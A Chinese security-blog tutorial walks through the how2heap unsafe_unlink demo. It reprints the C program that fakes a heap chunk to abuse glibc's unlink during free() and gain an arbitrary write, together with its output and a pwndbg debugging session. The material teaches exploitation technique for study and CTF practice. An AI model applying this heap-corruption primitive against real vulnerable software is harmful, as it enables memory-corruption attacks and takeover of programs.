# how2heap之unlink

阅读量 **909124**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-02-14 10:30:04

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01e0c10f1efb991b6e.jpg)

欢迎各位喜欢安全的小伙伴们加入星盟安全 UVEgZ3JvdXA6IDU3MDI5NTQ2MQ==

> 假期坚决不咕咕咕!!系列一中我记录了first-> fit,fastbin_dup,fastbin_dup_into_stack和fastbin_dup_consolidate四个文件的三种攻击方式,那么这次就记录一下unlink叭!

PS:由于本人才疏学浅,文中可能会有一些理解的不对的地方,欢迎各位斧正 🙂

## 参考网站

    
    
    https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/
    https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344nn
    http://blog.leanote.com/post/mut3p1g/how2heap
    https://xz.aliyun.com/t/2582#toc-5
    

## 环境

ubuntu16.04,gdb(pwndbg)

## unsafe_unlink

第一个就是经常会用到的一种技巧,unlink,下面我们先看源代码,同样的,我加了一小点注释并删了写作者的话

这里我觉得heap
exploitation里的例子更容易理解一点23333,这是之前的一个[总结](https://nightrainy.github.io/2019/07/19/unlink-study/)

当然,不想跳转的小伙伴我也会对unlink做一下简单的介绍,具体的介绍我们调试着看:)

**首先,什么是unlink?**

所谓unlink就是为了取出双向链表中的一个chunk

**那么什么时候需要取出双向链表中的chunk呢,也就是使用unlink的时机?**

  * malloc 
    1. 在恰好大小的large chunk处取chunk时
    2. 在比请求大小大的bin中取chunk时
  * Free 
    1. 后向合并,合并物理相邻低物理地址空闲chunk时
    2. 前向合并,合并物理相邻高物理地址空闲chunk时(top chunk除外)
  * malloc_consolidate 
    1. 后向合并,合并物理相邻低地址空闲chunk时。
    2. 前向合并，合并物理相邻高地址空闲 chunk时（top chunk除外）
  * realloc  
前向扩展，合并物理相邻高地址空闲 chunk（除了top chunk）。

**攻击效果呢?**

攻击效果就是 p处的指针会变为 p – 0x18;

好嘞下面我们回来,我删掉部分作者的话的大概意思:

请在ubuntu14.04和ubuntu16.04上测试,这个技巧运用在我们有一个已知区域的指针时,我们可以在这个指针上利用unlink这一技巧

最常见的情况就是在一个有溢出漏洞,又有一个全局变量的时候

好嘞我们直接看代码

###  源代码

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <stdint.h>
    
    
    uint64_t *chunk0_ptr;
    
    int main()
    {
            int malloc_size = 0x80; //we want to be big enough not to use fastbins
            int header_size = 2;
    
            //本测试的重点就是利用free来破坏我们的全局chunk0_ptr以实现任意地址写
            fprintf(stderr, "The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.nn");
    
            chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
            uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
    
            //全局指针为chunk0_ptr,我们将要攻击的chunk为chunk1_ptr
            fprintf(stderr, "The global chunk0_ptr is at %p, pointing to %pn", &chunk0_ptr, chunk0_ptr);
            fprintf(stderr, "The victim chunk we are going to corrupt is at %pnn", chunk1_ptr);
    
            //我们要在chunk0中伪造一个chunk
            fprintf(stderr, "We create a fake chunk inside chunk0.n");
    
            //我们把我们的fake_chunk的fd指向我们的chunk0_ptr来满足P->FD->BK=P
            fprintf(stderr, "We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.n");
    
            chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
    
            //我们把fake_chunk的bk指针指向我们的chunk0_ptr来满足P->BK->FD
            fprintf(stderr, "We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.n");
    
            //通过这么设置,我们就可以成功bypass堆的检测即(P->FD->BK!=P||P->BK->FD!=P)==FALSE
            fprintf(stderr, "With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == Falsen");
            chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
            fprintf(stderr, "Fake chunk fd: %pn",(void*) chunk0_ptr[2]);
            fprintf(stderr, "Fake chunk bk: %pnn",(void*) chunk0_ptr[3]);
    
            //我们假设我们可以通过溢出chunk0使得我们可以自由的更改chunk1的内容
            fprintf(stderr, "We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.n");
            uint64_t *chunk1_hdr = chunk1_ptr - header_size;
    
            //我们用chunk1的previous_size来收缩chunk0,让free认为我们的chunk0是在我们的伪造的chunk的地方开始的
            fprintf(stderr, "We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.n");
            fprintf(stderr, "It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordinglyn");
            chunk1_hdr[0] = malloc_size;
    
            //如果我们正常的free chunk0,那么chunk1的pre_szie将是0x90,然而现在是一个新的值
            fprintf(stderr, "If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %pn",(void*)chunk1_hdr[0]);
    
            //我们通过将chunk1的pre_size设置为false,就可以将我们所伪造的chunk标记为free状态
            fprintf(stderr, "We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.nn");
            chunk1_hdr[1] &= ~1;
    
            //现在我们free chunk1,这时发生向后合并将会unlink我们所伪造的chunk,从而覆写chunk0_ptr
            fprintf(stderr, "Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.n");
            fprintf(stderr, "You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344nn");
            free(chunk1_ptr);
    
            //在这个指针上,我们可以通过chunk0_ptr来覆写其自身以指向任意内存
            fprintf(stderr, "At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.n");
            char victim_string[8];
            strcpy(victim_string,"Hello!~");
            chunk0_ptr[3] = (uint64_t) victim_string;
    
            //chunk0_ptr如今指向了我们想要的地方,我们可以用它来写我们的字符串了
            fprintf(stderr, "chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.n");
            fprintf(stderr, "Original value: %sn",victim_string);
            chunk0_ptr[0] = 0x4141414142424242LL;
            fprintf(stderr, "New Value: %sn",victim_string);
    }
    

###  程序运行结果

    
    
    The global chunk0_ptr is at 0x602070, pointing to 0x255b010
    The victim chunk we are going to corrupt is at 0x255b0a0
    
    We create a fake chunk inside chunk0.
    We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.
    We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.
    With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False
    Fake chunk fd: 0x602058
    Fake chunk bk: 0x602060
    
    We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.
    We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.
    It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly
    If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80
    We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.
    
    Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.
    
    
    At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.
    chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.
    Original value: Hello!~
    New Value: BBBBAAAA
    

###  关键部分调试

自己翻译的毛毛躁躁的,如果单看代码和结果不理解的话不要着急,我们慢慢来,我们根据源码上推荐的网站先把unlink部分代码拉过来

    
    
    1344#define unlink(AV, P, BK, FD) {                                            
    1345     FD = P->fd;                                                               
    1346     BK = P->bk;                                                               
    1347     if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                     
    1348       malloc_printerr (check_action, "corrupted double-linked list", P, AV);  
    1349     else {                                                                    
    1350         FD->bk = BK;                                                          
    1351         BK->fd = FD;                                                          
    1352         if (!in_smallbin_range (P->size)                                      
    1353             && __builtin_expect (P->fd_nextsize != NULL, 0)) {                
    1354             if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)        
    1355                 || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    
    1356               malloc_printerr (check_action,                                  
    1357                                "corrupted double-linked list (not small)",    
    1358                                P, AV);                                        
    1359             if (FD->fd_nextsize == NULL) {                                    
    1360                 if (P->fd_nextsize == P)                                      
    1361                   FD->fd_nextsize = FD->bk_nextsize = FD;                     
    1362                 else {                                                        
    1363                     FD->fd_nextsize = P->fd_nextsize;                         
    1364                     FD->bk_nextsize = P->bk_nextsize;                         
    1365                     P->fd_nextsize->bk_nextsize = FD;                         
    1366                     P->bk_nextsize->fd_nextsize = FD;                         
    1367                   }                                                           
    1368               } else {                                                        
    1369                 P->fd_nextsize->bk_nextsize = P->bk_nextsize;                 
    1370                 P->bk_nextsize->fd_nextsize = P->fd_nextsize;                 
    1371               }                                                               
    1372           }                                                                   
    1373       }                                                                       
    1374 }
    

这里我们最主要需要绕过的地方就是(FD->bk != P || BK->fd != P)这里了,我们根据函数传进来的东西解释一下  
FD是我们所传进来的指针P的fd指针也就是FD=P->fd,而BK就是P->BK

也就是说,我们所需要满足的FD->bk=P,BK->fd=P其实就是

  1. P->fd->bk=P,即程序检测P的后一个空闲指针的前一个指针为P
  2. P->bk->fd=P,同理检测P的前一个空闲指针的后一个指针为P

如果我们想利用该怎么做呢?带着疑问让我们开始调试程序吧!

因为较为复杂,这里我下了8个断点,分别是

    
    
    ► 21   chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
      22   uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
    ► 27   fprintf(stderr, "We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.n");
      28   chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
    ► 31   chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
    ► 36   uint64_t *chunk1_hdr = chunk1_ptr - header_size;
    ► 39   chunk1_hdr[0] = malloc_size;
    ► 42   chunk1_hdr[1] &= ~1;
    
      50   strcpy(victim_string,"Hello!~");
    ► 51   chunk0_ptr[3] = (uint64_t) victim_string;
    
      55   chunk0_ptr[0] = 0x4141414142424242LL;
    ► 56   fprintf(stderr, "New Value: %sn",victim_string);
    

首先是第一个断点的地方,也就是malloc chunk0的地方

    
    
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 145,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603090 PREV_INUSE {
      prev_size = 0,
      size = 135025,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    

可以看到我们已经有了一个堆块,那么下面我们单步走完下一个,即把chunk1也分配了,此时的堆块

    
    
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 0x91,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603090 PREV_INUSE {
      prev_size = 0,
      size = 0x91,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603120 PREV_INUSE {
      prev_size = 0,
      size = 134881,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg>
    

好嘞,我们到下一个断点处,没错,就是这个地方

    
    
    ► 28   chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
    

程序的注释中说我们将fake_chunk的fd指向我们的chunk0_ptr,我们先看看这个所谓的chunk0_ptr[2]是个什么东西:

    
    
    pwndbg> p/x chunk0_ptr
    $3 = 0x603010
    pwndbg> p/x chunk0_ptr[2]
    $4 = 0x602058
    pwndbg> p/x &chunk0_ptr
    $5 = 0x602070
    pwndbg> x/10x 0x602070
    0x602070 <chunk0_ptr>:  0x0000000000603010      0x0000000000000000
    0x602080:       0x0000000000000000      0x0000000000000000
    0x602090:       0x0000000000000000      0x0000000000000000
    0x6020a0:       0x0000000000000000      0x0000000000000000
    0x6020b0:       0x0000000000000000      0x0000000000000000
    pwndbg> x/10gx 0x603010
    0x603010:       0x0000000000000000      0x0000000000000000
    0x603020:       0x0000000000602058      0x0000000000000000
    0x603030:       0x0000000000000000      0x0000000000000000
    0x603040:       0x0000000000000000      0x0000000000000000
    0x603050:       0x0000000000000000      0x0000000000000000
    

为便于理解,这里我一共输出了五样东西

可以看到,程序将chunk0_ptr[2]的值变成了chunk0_ptr-0x18的地址

记得之前所说的吗,我们需要在chunk0中伪造一个fake chunk

我们的chunk0_ptr是从0x603000开始的,但是我们要清楚的是给用户的指针却是从0x603010开始的(这其实也是glibc的机制,这里就不详述了).结合程序注释,这也就意味着我们所伪造的fake
chunk要从0x603010开始,以0x603020为fd指针,以0x603028为bk指针

此时我们的fd指针已经伪造好了,下面我们直接结束伪造bk指针的部分,此时的堆

    
    
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 145,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x602058,
      bk_nextsize = 0x602060 <stderr@@GLIBC_2.2.5>
    }
    0x603090 PREV_INUSE {
      prev_size = 0,
      size = 145,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603120 PREV_INUSE {
      prev_size = 0,
      size = 134881,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> x/10gx 0x603010
    0x603010:       0x0000000000000000      0x0000000000000000
    0x603020:       0x0000000000602058      0x0000000000602060
    0x603030:       0x0000000000000000      0x0000000000000000
    0x603040:       0x0000000000000000      0x0000000000000000
    0x603050:       0x0000000000000000      0x0000000000000000
    

好了,此时我们已经成功的伪造了我们fake
chunk的fd和bk指针,程序注释说我们这样就可以成功bypass那两个条件,也就是P->FD->BK=P&&P->BK->FD=P了,这是为什么呢?

我们现在假设我们的fake_chunk的size已经设好了,并且他的fd=0x602058,bk=0x602060,那么

fake_chunk->fd->bk是多少呢?我们看一下

    
    
    pwndbg> x/10gx 0x602058
    0x602058:       0x0000000000000000      0x00007ffff7dd2540
    0x602068 :      0x0000000000000000      0x0000000000603010<-bk
    0x602078:       0x0000000000000000      0x0000000000000000
    0x602088:       0x0000000000000000      0x0000000000000000
    0x602098:       0x0000000000000000      0x0000000000000000
    

看到了吗,此时的fake_chunk->fd->bk=0x603010,还记得我们刚刚所说的吗,我们所伪造的fake_chunk就是0x603010

因此第一个条件fake_chunk->fd->bk=fake_chunk达成,同理我们康康第二个条件

    
    
    pwndbg> x/10gx 0x602060
    0x602060 <stderr@@GLIBC_2.2.5>: 0x00007ffff7dd2540      0x0000000000000000
    0x602070 <chunk0_ptr>:  0x0000000000603010      0x0000000000000000
    0x602080:       0x0000000000000000      0x0000000000000000
    0x602090:       0x0000000000000000      0x0000000000000000
    0x6020a0:       0x0000000000000000      0x0000000000000000
    

同样的,我们成功达成了第二个条件,此时的fake_chunk也就是指向我们全局变量的chunk0_ptr已经可以bypass了,现在值得注意的是刚刚我们假设size已经设好了,但其实并没有

那么根据程序所说,假设我们可以溢出chunk0来自由的更改chunk1的内容,我们就可以通过更改chunk1的pre_size域来使得我们的chunk收缩以骗过malloc让他认为我们的chunk1的上一个chunk是从我们的fake
chunk处开始的

emmmm,关于heap
shrink,可以康康我之前的另一篇[文章](https://nightrainy.github.io/2019/07/25/chunk-extend-and-overlapping/)

拓展和收缩原理相同:)

好了,我们继续

    
    
      36   uint64_t *chunk1_hdr = chunk1_ptr - header_size;
     ► 37   fprintf(stderr, "We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.n");
    

现在程序运行到了这里,之前程序所定义的header_size是2,那么chunk1_ptr-2是什么东西呢?

    
    
    pwndbg> p/x chunk1_ptr -2
    $23 = 0x603090
    pwndbg> p/x chunk1_ptr
    $24 = 0x6030a0
    pwndbg> p/x 0x6030a0-0x603090
    $25 = 0x10
    

这里需要注意哦,指针的加减和平常的加减不太一样,这里我也写了个小demo,其实是从之前的文章里扒来的

demo.c

    
    
    #include <unistd.h>
    #include <stdlib.h>
    #include <string.h>
    #include <stdio.h>
    
    
    int main()
    {
            long long *chunk1,*chunk2;
            chunk1=malloc(0x80);
            chunk2=malloc(0x80);
            chunk1=100;
            chunk2=200;
            printf("%pn",&chunk1);
            printf("%pn",chunk1);
            printf("%pn",&chunk2);
            printf("%pn",chunk2);
            printf("%pn",chunk1-3);
            printf("%pn",chunk1-2);
            printf("%pn",chunk1-1);
            printf("%pn",&chunk1-3);
            printf("%pn",&chunk1-2);
            printf("%pn",&chunk1-1);
    }
    

编译运行结果

    
    
    '╰─# ./test
    0x7ffdd51db3f8
    0x64
    0x7ffdd51db400
    0xc8
    0x4c
    0x54
    0x5c
    0x7ffdd51db3e0 //chunk1-3
    0x7ffdd51db3e8 //chunk1-2
    0x7ffdd51db3f0 //chunk1-1
    

从小demo里就可以稍微理解指针加减了叭(雾

好的,下面我们继续分析.

程序做了什么呢?

程序将chunk1_ptr向前16位的地址赋给了我们的chunk1_hdr,这是做什么呢?

我们知道程序给我们的用户指针其实是free chunk的fd指针,因此向前16就意味着是chunk的pre_size域

我们继续让程序执行到给他赋值的地方,此时答案呼之欲出,这里的作用就是为了实现我们刚刚所说的堆缩,heap shrink:)

我们看下现在的堆

    
    
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 0x91,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x602058,
      bk_nextsize = 0x602060 <stderr@@GLIBC_2.2.5>
    }
    0x603090 PREV_INUSE {
      prev_size = 0x80,
      size = 0x91,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603120 PREV_INUSE {
      prev_size = 0,
      size = 134881,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    

看到了吗,这里chunk1的prev_size已经被设为了0x80,这也就意味着系统向前找chunk的时候会向前0x80找到我们的fake_chunk

    
    
    pwndbg> p/x 0x603090-0x80
    $27 = 0x603010
    

但这并不够,我们需要伪造chunk1是free态的chunk,那么只需要把标志位设位0就好了,程序继续运行到下一断点

    
    
       42   chunk1_hdr[1] &= ~1;
    

这里是一个赋0的操作

    
    
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 0x91,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x602058,
      bk_nextsize = 0x602060 <stderr@@GLIBC_2.2.5>
    }
    0x603090 {
      prev_size = 0x80,
      size = 0x90,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603120 PREV_INUSE {
      prev_size = 0,
      size = 134881,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    

好了,万事具备,只欠东风:)

free chunk1,这时就会发生unlink(为什么请看文章开头unlink时机

这里就是触发了free的后向合并从而调用unlink函数,此时的堆结构

    
    
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 145,
      fd = 0x0,
      bk = 0x20ff1,
      fd_nextsize = 0x602058,
      bk_nextsize = 0x602060 <stderr@@GLIBC_2.2.5>
    }
    0x603090 {
      prev_size = 128,
      size = 144,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603120 PREV_INUSE {
      prev_size = 0,
      size = 134881,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    

我们现在给chunk0_ptr[3]赋值,将chunk0_ptr[3]指向victim_string的内存

    
    
    pwndbg> p/x &victim_string
    $40 = 0x7fffffffe640
    pwndbg> p/x chunk0_ptr
    $31 = 0x7fffffffe640
    pwndbg> p/x chunk0_ptr[3]
    $37 = 0x7ffff7a2d830
    

这时我们可以发现,我们虽然修改的是chunk0_ptr[3],但其实修改的是chunk0_ptr的值

让程序继续跑,修改一下chunk0_ptr的值

    
    
    pwndbg> p victim_string
    $63 = "BBBBAAAA"
    

完美:)

## 总结

依旧,程序先是弄了一个全局变量chunk0_ptr,紧接着给他申请了0x80实际上是0x90的内存空间

之后新建了一个大小一样的chunk1_ptr

这时我们要确定的是我们的全局指针是chunk0_ptr,要攻击的chunk是chunk1_ptr

之后程序构造了P->FD->BK=P和P->BK->FD=P的条件,想要伪造一个fake_chunk

假设我们拥有溢出的能力,修改chunk1_ptr的pre_size域让系统认为我们的上一个chunk是我们伪造的fake
chunk,并且将chunk1_ptr的size域标志位置0以伪造其被free的假象

然后程序free掉了chunk1触发了free的后向合并从而调用了unlink函数,此时我们的攻击就算结束了

而程序的攻击效果就是将本来是P处的指针变为了P-0x18的指针,我们就拥有了任意内存读写的能力,over~

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **知世** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/197481](/post/id/197481)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)

 **+1** __5赞

 __收藏

![](https://p3.ssl.qhimg.com/t01b60c9bd9051ba29f.png) 知世

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

